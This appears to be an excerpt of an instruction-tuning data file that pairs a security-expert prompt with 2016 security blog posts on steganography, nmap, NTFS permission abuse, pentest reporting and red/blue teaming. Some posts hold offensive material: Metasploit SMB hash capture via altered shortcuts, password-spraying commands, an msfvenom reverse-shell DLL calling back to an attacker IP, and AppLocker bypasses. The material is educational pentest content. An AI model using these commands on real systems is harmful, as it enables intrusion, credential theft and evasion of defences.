than others n.wikipedia.org wiki Animal_Farm If you have 5005 and you change the 5 on the left to a 6 that's a much bigger difference a difference of a thousand than if you have 5005 and change the 5 on the right to a 6 a difference of one The five on the left in the thousands column would be called the most significant digit while the five on the right in the ones column would be the least significant digit and picking which five to change matters a lot Let's do some quick review images at least the ones we'll be working with here are made up of pixels arranged in a grid Each pixel is made up of three values R G and B By mixing the red green and blue values the pixel can be any color Just like in regular numbers the binary digits making up the pixels have different significance matter more the further to the left they are In images the least significant bit in R G and B for each pixel does nearly nothing while the most significant bit can really ruin your day For instance this is what happens when you take each of the 8 bits out of a black and white bitmap one layer at a time and make an image out of each layer Each image represents one significance level of bits the most significant bit is on the top left and the least significant on the bottom right See how the most significant bit top left makes up most of the image while the least significant bit bottom right is basically just random noise I bet you could change all of those least significant bits or maybe even the last two and nothing would look different in the final image perhaps you could change them in some sort of pattern like in a message say Just a thought Here's what happens when we take that puppy and flip the least significant bits of every pixel each of R G and B to all be 1 then the last two bits to both be one then the last three and so on Did you notice how the first few look totally fine So it's concluded we can definitely flip the first couple of bits in each pixel value of an image and change them however we want and nobody will be able to tell We just found ourselves a place to hide ______ Dakota runs Striker Security you can find more of his writing at trikersecurity.com blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>AppleTV & nmap -sV</title>\n<taxonomies>Author, Brian King, How-To, InfoSec 301, Apple, AppleTV, experiments, Nmap, testing</taxonomies>\n<creation_date>Tue, 11 Oct 2016 14:21:13 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "BBKing So I'm working the other day and my wife asks me why the TV is on I don't know I didn't turn it on But it's near my desk and I know nobody else turned it on either I had been running nmap on my local network to test something out though You may have heard that you want to be careful using nmap against printers because some of them will studiously print out the packets they receive and you may not want to use up all that paper Was my Apple TV doing something like that Turns out it was Join me for a little investigation-as-excuse-for-practicing-tools I find chasing my own questions teaches me more about how things work than reading a book or in some other way chasing other people's questions If you have an AppleTV do this Find out its IP address Settings General About IP Address Mine was at 192.168.10.110 While you're here see if you have model A1625 running tvOS 9.2.2 like I do maybe it matters then shut it off Then using a computer on the same network run an nmap version scan nmap -sV 192.168.10.110 Watch the little light on the AppleTV Mine comes about 30 seconds into the scan The full scan completes about two or three minutes after that and declares the following six ports to be open Version Scan Results I shut it off and ran the scan again and got the same results so I'm certain it was the scan that turned it on Now I want to know what's making it happen Maybe there's something in here I can use to control the AppleTV Can I turn it off Start some music Annoy my neighbor's AppleTV Let's see what's happening on the network during this time In one terminal window I ran tcpdump In another I ran the version scan again Using tcpdump to show traffic as you run a scanner or other automated tool is a good habit It helps you see that the thing is still running if it's not producing output It lets you see if you configured the scanner wrongly and now you're about to get yourself into trouble scanning the Wrong Things If you run it with no arguments you get packet headers dumped to stdout You can add a bpf filter to cut down on uninteresting traffic e.g 'not arp and the -n switch turns off name resolution and the use of well-known port names so you get shorter lines If you know the IP addresses you're looking for this can be a big help For things like this I find the less you let your tools interpret things the better I want to see port 22 not ssh because what's there may not actually be ssh all the time Tcpdump up top nmap down below I'm capturing the packets to a file -w appletv.pcap for later I'm thinking there's going to be one or two packets that's causing the thing to turn on here but let's see how many we have to sort through worst case before we start looking 2 869 packets is more than I want to look at How can we narrow this down That was the whole version scan and I know the thing I'm interested in is near the start of it Also I'm going to guess that the packet I want is going to be one sent to an open port and clearly the nmap scan will be trying to talk to closed ports too So let's try tcpdump again but only listening for the ports that we found to be open earlier That's 3689 5000 7000 7100 49152 62078 And I'm going to stop collecting traffic by hitting Ctrl-c as soon as I see the TV come on Down from 2869 to 122 packets That's a whole lot better I open the packet capture in Wireshark and start at the bottom most recent I'm looking for anything that looks like a conversation I notice this one Conversation of Interest Right-clicking on that packet and choosing Follow TCP Stream shows me this HTTP-ish conversation HTTP-ish Conversation Now RTSP is not HTTP but it's awfully similar in syntax here I can do this on the command line if I know what IP and port to send it to Looking back up at Wireshark it's port 5000 I shut off the AppleTV and try it piping the OPTIONS request to netcat The -e flag that I set for 'echo tells it to interpret backslash escape sequences so I get actual newlines instead of a literal backslash-n which would do nobody any good Same Response as Captured I get the same response but the AppleTV is still off so this is not the one I want But it's interesting that I get such a complete response from a system that is off Here's another candidate Odd-Looking HTTP Request This looks like something nmap is doing to get a specific response out of some specific system The request is GET nice 20ports 2C Tri 6Eity.txt 2ebak nice ports Trinity.txt.bak yes this is nmap creativity at work Why do they send a request like this Answer eclists.org nmap-dev 2006 q2 207 Anyhow I sent this one and got no response at all And no TV wakeup This is also not the one I want Going further towards the beginning I see two bare GET requests to different ports GET HTTP 1.0 to Port 3689 I can send that echo -en GET HTTP 1.0 n n nc 192.168.10.110 3689 ..and the TV comes on This turned out to be it Just a GET is all it takes to turn the AppleTV on from the network So there's my answer It was a generic test that's part of the nmap version scanning logic Just like the thing where scanning a printer makes it print stuff this is a side-effect of the scanner not its intended functionality And it's not a bug or a tricky way some obscure packet is handled It's the most basic possible HTTP request Interesting That seems to suggest some functionality of the AppleTV is probably exposed through this port and at least some of it doesn't require authentication Looking around the web for information about this port I came across this Unofficial AirPlay Protocol Specification that explains some of what I'm seeing here and gives ideas for further research to.github.io AirPlay.html If you're interested in how far this goes that would be my next step"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Take Advantage of Weak NTFS Permissions</title>\n<taxonomies>Author, David Fletcher, External/Internal, Red Team, NTFS Permissions, pen-testing, Pentesting</taxonomies>\n<creation_date>Thu, 13 Oct 2016 16:35:01 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Weak NTFS permissions can allow a number of different attacks within a target environment This can include Access to sensitive information Modification of system binaries and configuration files dll hijacking are things These are things a penetration tester might typically consider However there are other opportunities that testers should be looking for especially when we only have limited privileges and want to escalate or expand that access within an environment The following method is useful in an environment where privilege escalation or lateral movement is limited due to compensating controls It is recommended that techniques such as password spraying and host assessment with tools like PowerUp be exhausted prior to use of this method With the limitations understood what kind of access are we looking for within an environment In this instance we're interested in the ability to write to locations where we might be able to get another user or scanner to execute content Typically what we'll be looking for are shares used for solutions such as roaming profiles folder redirection or users home directories In the case of the former administrators configure these solutions for ease of access the ability to backup personal user content and to support remote access and virtualization Folder redirection can be configured using Group Policy If you are unfamiliar additional details can be found at the following URL echnet.microsoft.com en-us library cc732275 v ws.11 .aspx Similarly roaming profiles can be set up within the user's Active Directory account settings A network share is usually identified where all of the user's profile information instead of individual folders will be stored Again for those who are unfamiliar additional details can be found at the following URL echnet.microsoft.com en-us library jj649079 v ws.11 .aspx On the same dialog above we can see the field to specify the user's home folder Typically this is also a shared location However the home folder may not contain items that we'll be targeting in the attack outlined below shortcuts or internet favorites but it is still a valuable location if we have write access So how do we find these sensitive locations once we're in an environment The Profile Path and Home Folder properties can be interrogated by a standard user using the Get-UserProperties commandlet of PowerView as described in this blog post by HarmJ0y It is a bit more difficult to identify shared folders used to support folder redirection In order to locate these folders the SYSVOL share will have to be searched for the folder redirection policy That is unless the user account you're using has folder redirection applied In this case you can inspect the INI files described in this article to determine folder redirection targets Once the target locations have been identified on the network the Invoke-ShareFinder commandlet of PowerView or a similar tool can be used to determine where accessible folders exist with the CheckShareAccess switch Usage of Invoke-Sharefinder can be found at the following blog posts by HarmJ0y ww.harmj0y.net blog powershell veil-powerview-a-usage-guide ww.veil-framework.com hunting-sensitive-data-veil-framework Now that we've hopefully found writable locations what kind of attacks can we execute Some obvious ones include modification of commonly accessed files within the My Documents folder This could include addition of a malicious macro such as a PowerShell Macro from unicorn.py Instead we might backdoor an existing executable using a tool like msfvenom as described below ww.offensive-security.com metasploit-unleashed backdooring-exe-files In both cases we are hoping that a user executes the content resulting in an additional session and expanded access within the environment Instead of using one of these methods we are going to explore a different option This method involves the use of the Metasploit auxiliary server capture smb module This module is used to collect hashes for cracking via a malicious SMB server Options for the module can be seen below This Metasploit module would be run on a host that the attacker controls The IP address and port can be set via the SRVHOST and SRVPORT options respectively In addition the module can be configured to log the captured challenge response transaction in either a Cain Abel or John the Ripper formatted output file for consumption by one of these two tools After setting options for the module the attacker must execute the run command to start the server The SMB server will then listen in the background and report when an smb hash is received and recorded to one of the specified output files Execution of the module and display of the running job can be seen below Finally the attacker can modify a shortcut or favorite within the writable directory to cause the user to make a connection and pass hashes to the waiting Metasploit module As an example checking the favorites of a user might reveal something like the one seen below The attacker replaces the correct URL ww.bing.com with the attacker's IP address and appropriate protocol file 172.16.189.131 Then when the target user executes the selected shortcut or favorite their computer automatically attempts to perform challenge response authentication with the server Metasploit displays these attempts at the console and logs them to the specified output file Capture output can be seen below The resulting hashes can then be transferred to a password cracker to recover the user's credentials It should be noted that the modified shortcut will no longer work properly However this is likely to be ignored by the end user In addition the modified file may catch credentials from a scheduled scanner performing an authenticated vulnerability scan The scanning account is likely to have administrator privileges which could result in quick success if a strong password is not used"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How a No-Name, Nobody-Ever-Heard-Of, Kid* Like Me Got Hired by BHIS from a Craigslist Ad</title>\n<taxonomies>Author, InfoSec 101, Jordan Drysdale, best place to work on Earth, Craigslist, new jobs, problem solving, text only resume</taxonomies>\n<creation_date>Thu, 20 Oct 2016 17:22:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Step 1 Craigslist Step 2 Magic Time Step 3 Profit I traveled to Scottsdale last year to enjoy some Citrus fruit around my uncle's pool after deciding that my job was not exactly the best thing for my health I had been working crazy hours was bogged down with one disaster after another Life literally had come crushing down on my soul like a brick on an ant The smallish town from which BHIS hails is not exactly known to be some kind of employment mecca so generally speaking people just settle for what's available I was considering moving back toward Colorado since so many of my formative years were spent in Fort Collins and Denver Jobs were plentiful the outdoors beckoned and I missed my family down there It was time to make a decision when through one of the world's single largest jobs marketplaces I found a post from BHIS The wifey certainly scoffed at the thought and cautioned against sharing personal information We discussed it briefly forgot about it and headed to Scottsdale to spend some time with family My uncle is a crazy successful entrepreneur there and was at one point Scottsdale's Business-Person of the Year This is no small achievement for anyone and his advice was simple Ask yourself what you have to lose and what you have to gain If you haven't seen this Craigslist post you should We had almost forgotten about the job post and I was sure I'd missed the deadline that last night in Scottsdale I checked it out drafted a text-only resume and submitted it I wondered Why in the world BHIS would request a text-only resume I've come to find out if you know any of these folks and their Word Web Bugs or TrackBack trickery you get it Word docs can contain all sorts of hackery fun The chances of someone at this company opening a file attachment with a .docx extension are close to hell freezing solid Anyway Rick from BHIS called a couple of days later to discuss some pre-req Linux questions and scheduled a follow up with Mike Mike called and drilled me spoke in Spanish and asked me to come in and meet John Interviewing with John is like standing in front of a firing squad with itchy trigger fingers Oh you wirelessed at your previous gig So which came first WPA1 or WPA2 I went ahead and assumed he wouldn't bother asking if it was obvious and asked him to explain As those of you who have attended one of John's classes engagements or other public speaking series events you know he is not short on explanations He also asked ...based on your networking background is it possible to connect to port 70000 Hmmm I pondered and as far as I knew it was impossible John asked me to figure it out and yes it is possible Anyway I guess the point here is that you too can find your dream job This company has challenged me every single day to be the absolute best I can at logic and problem solving I've been challenged to navigate mistakes work with our employees and customers on a level that I had never experienced before It definitely wasn't about what I knew or didn't know at the time I was expected to under pressure make intelligent and analytical decisions That led me to figure out the C compiler uses math and simply starts over after the highest port So instead of him connecting to port 70000 and typing commands back and forth the compiler had dumped that connection on to port 4464 Sure I needed to ask him to fire up tcpdump and the answer was staring at me in trace data but that's not the point Trust in yourself This industry needs more analytical problem solvers Keep looking we will keep hiring the best and brightest ______ Editor's Note We would describe Jordan as more like a guy and less like a kid but either way we kinda like him"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Steganography: The Art and Science of Hiding Things in Other Things - Part 2</title>\n<taxonomies>How-To, binary, digital hide-and-seek, hiding, steganography</taxonomies>\n<creation_date>Fri, 21 Oct 2016 16:23:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Part 2 Hiding Data in Images Dakota Nelson In part 1 we talked about how bits make up images and what that means for our game of digital hide-and-seek In this post we'll take our new hiding place and put it to work hiding things as one does Now that we know where to hide how do we actually take advantage of that knowledge With programming of course The first thing we need is something to hide I'll leave the more questionable part of that to you and just use this snippet of Python instead which will take some text and turn it into a list of bits let's get our message set up message list 'this is a message convert to binary representation message 07b '.format ord x for x in message print Message as binary print message split the binary into bits message bit for bit in x for x in message flatten it and convert to integers message int bit for sublist in message for bit in sublist print Message as list of bits print message The final output of this should be a message that looks like this 1 1 1 0 1 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 1 1 1 1 0 0 1 1 0 1 0 0 0 0 0 1 1 0 1 0 0 1 1 1 1 0 0 1 1 0 1 0 0 0 0 0 1 1 0 0 0 0 1 0 1 0 0 0 0 0 1 1 0 1 1 0 1 1 1 0 0 1 0 1 1 1 1 0 0 1 1 1 1 1 0 0 1 1 1 1 0 0 0 0 1 1 1 0 0 1 1 1 1 1 0 0 1 0 1 Which is the phrase this is a message in binary Woo We have something to hide Now we have to take this image And put our message into it hiding it in the least significant bits of the image We'll use this code snippet which opens up an existing image and adds a message into it repeating each bit in the message nine times for reasons that will become clear in a moment from PIL import Image ImageFilter import numpy as np first open the original image imgpath 'images original image.bmp img Image.open imgpath we'll use simple repetition as a very rudimentary error correcting code to try to maintain integrity each bit of the message will be repeated 9 times the three least significant bits of the R G and B values of one pixel imgArray list np.asarray img def set_bit val bitNo bit given a value which bit in the value to set and the actual bit 0 or 1 to set return the new value with the proper bit flipped mask 1 bitNo val mask if bit val mask return val msgIndex 0 newImg this part of the code sets the least significant 3 bits of the R G and B values in each pixel to be one bit from our message this means that each bit from our message is repeated 9 times 3 each in R G and B This is a waste technically speaking but it's needed in case we lose some data in transit using the last 3 bits instead of the last 2 means the image looks a little worse visually but we can store more data in it a tradeoff the more significant the bits get as well the less likely they are to be changed by compression we could theoretically hide data in the most significant bits of the message and they would probably never be changed by compression or etc but it would look terrible which defeats the whole purpose for row in imgArray newRow for pixel in row newPixel for val in pixel iterate through RGB values one at a time if msgIndex len message if we've run out of message to put in the image just add zeros setTo 0 else get another bit from the message setTo message msgIndex set the last 3 bits of this R G or B pixel to be whatever we decided val set_bit val 0 setTo val set_bit val 1 setTo val set_bit val 2 setTo continue to build up our new image now with 100 more hidden message newPixel.append val this adds an R G or B value to the pixel start looking at the next bit in the message msgIndex 1 newRow.append newPixel this adds a pixel to the row newImg.append newRow this adds a row to our image array arr np.array newImg np.uint8 convert our new image to a numpy array im Image.fromarray arr im.save image_steg.bmp You're probably wondering why are we repeating the message so much Nine times per bit seems excessive It turns out that we aren't the only people who have noticed that the least significant bits in an image are basically random Someone has beaten us to our own hiding place and they're using it for boring stuff The objective of compression according to Wikipedia is to reduce irrelevance and redundancy of the image data in order to be able to store or transmit data in an efficient form But that irrelevant and redundant data is where we wanted to put our sneaky message stuff and compression destroys those bits Drat Turns out if there are useless bits such as the least significant bit of each pixel value they're perfect for hiding things in because nobody cares about them but also the first to get thrown out by compression because nobody cares about them So we fight back by repeating ourselves a bunch so that even if some bits get flipped by compression our data still mostly makes it through It's not elegant but it works This will be better explained in part 3 where we'll get into more elegant methods using some cool math Once we run the image through our code it looks like this Which might look familiar and now we know the message that this puppy is hiding from part 1 But how do we get it out once it's been put in Here's how open the image and extract our least significant bits to see if the message made it through img Image.open path imgArray list np.asarray img note that message must still be set from the code block above or you can recreate it here origMessage message 20 take the first 20 characters of the original message we don't use the entire message here since we just want to make sure it made it through print Original message print origMessage message for row in imgArray for pixel in row we'll take a count of how many 0 or 1 values we see and then go with the highest-voted result hopefully we have enough repetition count 0 0 1 0 for val in pixel iterate through RGB values of the pixel one at a time convert the R G or B value to a byte string byte 08b '.format val then for each of the least significant 3 bits in each value for i in -1 -2 -3 try to get an actual 1 or 0 integer from it try bit int byte i except if somehow the last part of the byte isn't an integer this should never happen print bin val raise count up the bits we've seen if bit 0 count 0 1 elif bit 1 count 1 1 else print WAT and once we've seen them all decide which we should go with hopefully if compression or anything flipped some of these bits it will flip few enough that the majority are still accurate if count 1 count 0 message.append 1 else message.append 0 even though we extracted the full message we still only display the first 20 characters just to make sure they match what we expect print Extracted message print message 20 Run this on the image and you get the first 20 characters of the original message and newly-extracted message Original message 1 1 1 0 1 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 Extracted message 1 1 1 0 1 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 Awesome They're the same We just moved data around hidden in an image using steganography Something to try on your own can you reassemble these bits back into text by reversing the process from earlier Being able to extract steganographically encoded data from an image is cool but having to repeat ourselves so much means that we can't move very much data and that it's fairly obvious the image with hidden data in it looks different enough from the original that you can tell something is up if you look closely enough This image is 500 by 500 pixels which means since we can only hide one bit of data per pixel that we can only hide just over 31 kB of data in this image That's great and somewhat useful but you're going to need a lot of pictures to send any significant amounts of data especially since we're using the least significant 3 bits in the image and we'd prefer to use less so that the image doesn't look any different In part 3 we'll explore how to use more complicated error correcting codes to make our data hiding more efficient Special thanks to Zoher Ghadyali and Philip Seger for collaborating years ago on an original version of the code that these code snippets have been modified from ______ Dakota runs Striker Security you can find more of his writing at trikersecurity.com blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Not Suck at Reporting (or How to Write Great Pentesting Reports)</title>\n<taxonomies>Author, David Fletcher, Red Team, pentest reporting, pentest reports, Pentesting, red team life, reporting, technical writing, writing</taxonomies>\n<creation_date>Mon, 24 Oct 2016 17:13:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Reporting is a penetration testing topic that doesn't have a whole lot of popularity People have a hard time being inspired to write about the technical details of their engagements In some cases testers skim the surface only identifying the successful portions of their test In others testers just regurgitate the output from some scanning tool calling the results the final report However sometimes you find a tester who creates a work of art It covers successful exploitation the things that didn't work identifies the impact of a vulnerability in a way that the organization can understand recommends corrective action and does so in a manner that tells a story such that the organization can recreate the results or retest directly from the report itself It is this type of report that we strive to create for every engagement here at BHIS The next few paragraphs will explain what I believe are the most important aspects of good reporting I've put them in order of what I believe to be most critical to providing value to your customer So let's go ahead and get started 1 The Scientific Method All of the steps are critical to our success because they feed into the last step share Most people will be familiar with the steps outlined by the scientific method question hypothesize experiment observe record analyze and share results Application of this methodology was beaten into me by engineering school as I was forced to write lab reports in this style at least once every week for four years When reporting on a penetration test we can apply this method to each vulnerability that we find in an environment Let's break each step down Question Many of our questions are typically asked up front by a vulnerability scanner However we should be prepared to ask additional questions once we've processed the scanning results Questions such as What are the not-so-common listening ports on the network Where might I be able to use default credentials or What happens when Hypothesize Typically this step involves interpreting scanning results or a response from an application or service that we're interacting with This can include selection of a tool or technique that we believe may be successful against a particular service or host Experiment This is execution of the actual exploit or tool that we've identified in the hypothesize step Observe Record Here we record the outcome of our exploitative effort Analyze Did it work did it fail why What can we learn from it At this point we may change our hypothesis or identify a different approach or tool for the experiment Share Here we document the results of the process Share is the step that is most emphasized in engineering disciplines An experiment means nothing if the results cannot be independently verified Repeatability is what we strive for in our testing and a critical element is that our customers can independently validate our results 2 Tell a Story Each vulnerability that you investigate should have a story attached to it You should attempt to answer the following questions for each vulnerability you investigate What drew you to this element vulnerability scanning results an unidentified listening service an uncommon open port What was the vulnerability What impact does it have on the organization Did you attempt to exploit it How difficult was it to construct an exploit What was the result of the exploit attempt Can further exploitation be attained What can the organization do to remediate the issue What can the organization do to mitigate the issue Reporting usually has the competing priorities of full coverage and brevity However your report should include details on failed attempts at exploitation as much as successful ones This shows the target organization where defenses are working and helps them to understand your approach to executing the test 3 Write as You Go Instead of collecting artifacts and assembling the story once the test is complete you should try to write the methodology section of your report as you go This allows you to record your actions take screen captures and identify potential findings as a stream of consciousness This account of your testing activity does not need to be perfect However it goes a long way in completing your report as it will only need a small amount of polish and full write-up of any findings identified within it 4 Organization There are several ways to approach organization within a report and none of them are wrong The easiest is likely chronological order By recording as you test you ensure that all of the pertinent details are captured and that none of your testing needs to be accomplished twice Since most scanning tools record vulnerabilities by a relative risk rating it is likely that chronological order will coincide with a risk rating order as well This ensures that the most important material is at the beginning of your methodology section However it may be wise to add content to sections as they make sense Many high risk vulnerabilities will be identified in the Informational findings while exploring a vulnerability scan Moving this information to the beginning of the report may make the most sense In addition grouping similar vulnerabilities together may be appropriate As an example misconfigurations in TLS SSH and RDP services have a similar impact and so it makes sense to keep them in the same area of the report 5 Illustration Make sure to include many illustrative screenshots of the condition that you're investigating the tools used to exploit it and the results of exploitation Within each screenshot you should also zoom in on the point of interest and have indicators highlighting the action A screenshot doesn't help if your audience can't figure out what it is trying to convey However a well thought out image of the situation can go a long way in helping to recreate results and driving home the impact of the activity As you're putting these illustrations together be cautious of the information that you are displaying In many cases the elements of a test that drive business impact are sensitive in nature Some may be obscure like password hashes but others are more direct like personally identifiable information or protected health information As a penetration tester we never know where our reports might end up whose hands they will be in or the motivation of the individual reading As a result we absolutely must make sure that graphics are properly redacted 6 Voice and Tense As much as possible reports should use past tense Since a penetration test is a point in time assessment it is appropriate to identify the vulnerabilities that WERE present in the environment at the time of testing This helps to remind the reader that changes may have occurred within the environment affecting the vulnerabilities identified within the report These changes could result in degradation or improvement of the overall posture of the environment Third person is an almost universal requirement in official technical and engineering writing Penetration test reporting is no exception As a result you should avoid using first and second person pronouns such as I we and you Instead replace them with third person nouns and pronouns such as testers the tester he she him her and it Active versus passive voice has a long-standing flame war akin to vi versus emacs within the scientific community Some argue that active voice is more concise and clear Others indicate that passive voice helps to avoid first person pronouns and stresses what was accomplished Just like the question of your favorite editor this is a personal choice that is up to you A full treatment on the subject can be found at the following URL gi.duke.edu web sciwriting index.php?action passive_voice Whatever your choice just make sure to use it consistently throughout your writing 7 Consistency Many penetration test reports don't end up being authored by a single individual Usually just like the penetration tests themselves the report is composed of separate sub-elements authored by several members of the testing team Because of this a single editor should review the report in its entirety to ensure that all of the individual sections apply the same tense voice and styles in a consistent manner Otherwise the report will feel fragmented when a customer reads it The individual sections don't have to be perfect mirrors of one another but they should strive to avoid wild contrasts that clash with one another 6 Grammar and Spelling Grammar and spelling may seem to be a bit nit picky However we operate in a field that stresses attention to detail As such we should demonstrate the same attention to detail in our reporting Spell checkers are ubiquitous in nearly all applications so misspelled words are rarely forgiven Some things you should always look carefully for are Misused words A correctly spelled word that has the wrong meaning given the context Contractions Don't use them unless you have to but if you do make sure that you're using the right one your and you're are not the same thing Acronyms Make sure you expand them before first use in a report Numbers consistently use digits or spell out values based on their size or value One of the techniques that I use a lot is the old read it backwards trick When you read a sentence you wrote you will tend to apply the meaning you intend and skip words By reading backward you avoid applying your own context and focus on the words that are on the page 8 Fight for Feedback After you're done reading your report and are satisfied with the content give it to someone else on your team Ensure that it gets reviewed for technical accuracy and for adherence to your reporting standard voice tense person grammar and spelling At BHIS we employ a two-tiered review process that mirrors this recommendation After a tester is happy with their offering it is sent for peer review to determine technical accuracy The report is returned to the original tester for edits Some are incorporated and others discarded We leave the decision up to the original author After the initial editing round is complete the tester forwards the report to our very own grammar police They make sure that a real human being as opposed to a technophile tester can read and understand the contents of the report The original author once again accepts or rejects changes and then delivers to the customer This process helps to ensure that our reports are top-notch Conclusion It is our responsibility to ensure that our customers can grasp the concepts illustrated in our penetration testing reports Applying the techniques outlined above can help to ensure that we understand and satisfy that responsibility Our reports are typically the only artifact that remains after the test is complete They illustrate business value to the organizations that we test By distinguishing ourselves through comprehensive and accurate reporting we can keep businesses coming back for service If you are interested in an excellent writing reference check out The Tongue and Quill It is a very comprehensive writing style guide published by the US Air Force I have had a copy on my bookshelf since 1993 and I reference it often A PDF file is available at tatic.e-publishing.af.mil production 1 saf_cio_a6 publication afh33-337 afh33-337.pdf"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Red + Blue = Purple</title>\n<taxonomies>Author, Blue Team, David Fletcher, Red Team, Blue Team, Conference Talk, GrrCon, Purple Team, Red Team, Red Team vs. Blue Team</taxonomies>\n<creation_date>Wed, 26 Oct 2016 16:01:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Sally Vandeven We gave a presentation at the GrrCon hacker conference in Grand Rapids MI on October 6 2016 The presentation was a dialogue meant to illustrate the friendly banter between a blue-teamer trying to protect a network and a red-teamer trying to attack it The topics that were discussed are some of the more prevalent ways BHIS has found to gain access escalate privilege and dominate in typical enterprise environments We also talked about some of the things the blue team can do to prepare for a pentest and make the testers job that much harder Here is the presentation with some supporting material below including command examples and references regarding the topics discussed during the presentation outu.be und5ZsO0F7s Password Spraying This refers to a password guessing attack on an enterprise The pentester creates a list of account names either using the command line and querying Active Directory or by harvesting usernames from open source intel Then a common password is used say Autumn2016 and a login is attempted for each username on the list Because of account lockout policies this has to be done with care so that the organization's users do not get locked out of their accounts Guess one single password for each user per observation window so you don't risk locking out accounts How to launch a password spray attack on a domain from the command line First check the password policy which includes the lockout settings C net accounts domain The example below shows a domain password policy For a password spray on this network we would select simple eight character passwords like Fall2016 or Summer16 users tend to stick to the minimum length and we would spray one password every ten minutes The Lockout observation window defines how long after the last incorrect password before the bad-password-counter is reset to zero So after one incorrect password the bad-password-count is one but if we wait for ten minutes that count gets reset to zero and we can guess again This greatly reduces the chances of locking out accounts There are some issues though with services accounts that may not be subject to the same lockout rules Additionally the bad-password-count does not get replicated between redundant DCs so if the account is authenticating to different DC's at each login there could be a conflict So our rule of thumb is one guess per observation window Once you know the password policy you can create a userlist using either the wmic utility strip off the first line from the file that gives the column header or PowerShell In our experience the PowerShell command is faster but you may not always have access to PowerShell so both are shown below C wmic useraccount where domain USERDOMAIN get Name userlist.txt PS C adsisearcher objectCategory User .Findall ForEach _.properties.samaccountname Sort Out-File -Encoding ASCII Note Above is a one line PowerShell command with a space between ForEach and Then test each credential with the following FOR loop that mounts the share LOGONSERVER IPC using each username in userlist.txt and the password which you have placed in the file pass1.txt FOR F n in userlist.txt DO FOR F p in pass1.txt DO net use LOGONSERVER IPC user USERDOMAIN n p 1 NUL 2 1 echo n p net use delete DC1 IPC NUL Script it You can also use Beau Bullock's PowerShell script Invoke-DomainPasswordSpray.ps1 This script will do it all for you All you have to do is point it at a user list and give it a password in this case Autumn2016 If you give a list of passwords as an argument the script will guess one password for each account per observation window Actually you don't even have to give it a user list If you don't it will generate a list at runtime Sweet PS C Invoke-DomainPasswordSpray -Domain USERDOMAIN -UserList userlist.txt -Password Autumn2016 References DomainPasswordSpray.ps1 script ithub.com dafthack DomainPasswordSprayPassword Spraying an OWA Portal blog post ww.blackhillsinfosec.com ?p 5089 AppLocker Bypass Secondary Execution When a running process starts up a second process that second process is started by what is referred to as secondary execution and it is not detected by AppLocker This means that AppLocker rules do not get applied In other words it is a way to get an executable file to run even if it has NOT been explicitly allowed by AppLocker There are a couple of ways to accomplish secondary execution The first is using RUNDLL32.EXE and the second is by using REGSVR32.EXE Examples of both are shown below Use Metasploit's msfvenom utility to create a malicious DLL file In this case the DLL file will make an outbound connection using HTTPS to a listening server on IP address 192.168.2.10 443 The DLL file can be executed using either RUNDLL32.EXE or REGSVR32.EXE msfvenom p windows meterpreter reverse_https -f dll LHOST 192.168.2.10 LPORT 443 C temp malicious.dll C Windows System32 rundll32.exe C temp malicious.dll Control_RunDLL OR C regsvr32.exe s u malicious.dll Another AppLocker bypass is to use InstallUtil.EXE to directly access .NET functions and fly under the AppLocker radar See PowerShell w o PowerShell BHIS blog post referenced 